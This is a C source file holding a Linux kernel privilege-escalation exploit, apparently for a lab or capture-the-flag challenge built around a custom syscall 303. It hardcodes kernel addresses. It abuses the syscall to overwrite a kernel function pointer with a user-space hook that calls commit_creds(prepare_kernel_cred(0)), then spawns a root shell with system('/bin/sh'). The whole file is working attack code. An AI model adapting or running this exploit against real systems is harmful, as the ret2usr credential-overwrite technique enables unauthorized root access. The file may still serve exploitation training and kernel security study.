#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>

#define CAPITAL_SYS_CALL_NR 303
#define __u64 uint64_t

static unsigned long *impl_pointer = (unsigned long*) 0xffffffc008722000;
static unsigned long *prepare_kernel_cred = (unsigned long*) 0xffffffc010068990;
static unsigned long *commit_creds = (unsigned long*) 0xffffffc010068ac0;

static long hook_sys_capital_impl(__u64 arg1, __u64 arg2) {
    // create function pointers for prepare_kernel_cred and commit_creds
    // by using the addresses retrieved from /proc/kallsyms
    char* (*pkc)(int) = (char*(*)(int)) prepare_kernel_cred;
    void (*cc)(char*) = (void(*)(char*)) commit_creds;

    // call commit_creds(prepare_kernel_cred(0)) in order to create a new privileged
    // cred struct and assign it to the currently running process
    (*cc)((*pkc)(0));

    return 0;
}

void shell() {
    // if we are a root user, execute /bin/sh and spawn a root shell
    if (!getuid()) {
        printf("[+] Enjoy your shell\n");
        system("/bin/sh");
    } else
        printf("[-] No shell for you. Try again!\n");
}

int main() {
    // contains the address of hook_sys_capital_impl
    char in[8] = "\xa0\x06\x40\x03\x03\x03\x03";

    // first syscall overwrites impl_pointer
    syscall(CAPITAL_SYS_CALL_NR, in, impl_pointer);
    // second syscall calls commit_creds(prepare_kernel_cred(0))
    syscall(CAPITAL_SYS_CALL_NR, in, impl_pointer);
    // try to get a shell
    shell();

    return 0;
}
